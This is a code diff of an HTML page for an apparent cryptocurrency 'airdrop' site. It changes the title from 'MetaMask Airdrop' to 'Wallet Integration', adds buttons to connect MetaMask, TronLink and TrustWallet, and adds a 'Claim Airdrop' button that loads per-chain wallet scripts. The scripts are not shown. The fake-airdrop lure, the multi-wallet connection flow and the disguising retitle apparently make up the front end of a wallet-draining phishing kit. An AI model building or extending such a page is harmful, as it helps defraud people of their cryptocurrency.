@@ -3,27 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MetaMask Airdrop</title>
+    <title>Wallet Integration</title>
     <link rel="stylesheet" href="css/styles.css">
-    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider/dist/detect-provider.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <h1>MetaMask Airdrop2</h1>
-        <button id="connectButton">Connect MetaMask</button>
+    <div>
+        <button id="connectMetaMaskButton">Connect MetaMask</button>
+        <button id="connectTronlinkButton">Connect TronLink</button>
+        <button id="connectTrustwalletButton">Connect TrustWallet</button>
         <button id="claimAirdropButton" disabled>Claim Airdrop</button>
     </div>
 
-<script src="js/common.js"></script>
-<script src="js/metamask.js"></script>
-<script src="deeplinks/metamask-deep.js"></script>
-<script src="js/loader.js"></script>
+    <!-- Load common logic -->
+    <script src="js/common.js"></script>
+    
+    <!-- Load wallet-specific scripts (conditionally) -->
 
- <script src="js/eth.js"></script>
-    <script src="js/bsc.js"></script>
-    <script src="js/tron.js"></script>
+    <!-- MetaMask-related files (conditionally loaded when MetaMask is selected) -->
+    <script id="metamaskScript" src="js/metamask.js" style="display:none;"></script>
+    <script id="metamaskDeepLink" src="deeplinks/metamask-deep.js" style="display:none;"></script>
 
+    <!-- Ethereum, BSC, Tron (conditionally loaded based on user choice) -->
+    <script id="ethScript" src="js/eth.js" style="display:none;"></script>
+    <script id="bscScript" src="js/bsc.js" style="display:none;"></script>
+    <script id="tronScript" src="js/tron.js" style="display:none;"></script>
+
+    <!-- Load the loader script to initialize the wallet connection -->
+    <script src="js/loader.js"></script>
+
+    <script>
+        // Event listeners to load the relevant scripts based on user wallet choice
+        document.getElementById('connectMetaMaskButton').addEventListener('click', function() {
+            loadScript('js/metamask.js');
+            loadScript('deeplinks/metamask-deep.js');
+        });
+
+        document.getElementById('connectTronlinkButton').addEventListener('click', function() {
+            loadScript('js/tron.js');
+            loadScript('deeplinks/tron-deep.js');
+        });
+
+        document.getElementById('connectTrustwalletButton').addEventListener('click', function() {
+            loadScript('js/trustwallet.js');
+            loadScript('deeplinks/trust-deep.js');
+        });
+
+        // Function to load wallet-specific scripts
+        function loadScript(src) {
+            // Check if the script is already loaded
+            if (!document.querySelector(`script[src="${src}"]`)) {
+                var script = document.createElement('script');
+                script.src = src;
+                document.body.appendChild(script);
+            }
+        }
+    </script>
 </body>
 </html>
 
